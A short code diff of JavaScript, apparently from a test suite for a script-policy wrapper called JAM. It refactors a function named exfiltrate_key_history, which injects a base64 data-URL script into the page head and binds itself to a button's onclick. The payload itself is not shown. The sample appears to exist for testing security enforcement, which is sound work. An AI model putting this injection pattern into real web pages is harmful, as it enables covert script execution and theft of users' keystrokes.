@@ -3,11 +3,9 @@ function exfiltrate_key_history() {
   var URL = "data:text/javascript;base64," + data$$18;
   var script = document.createElement("script");
   script.src = URL;
-  var v2 = document.getElementsByTagName("head");
-  var v0 = v2[0];
-  JAMScript.call(v0.appendChild, v0, [script]);
+  var v0 = document.getElementsByTagName("head")[0];
+  JAM.call(v0.appendChild, v0, [script]);
   return
 }
-var v1 = document.getElementById("test");
-JAMScript.set(v1, "onclick", exfiltrate_key_history);
+JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);
 
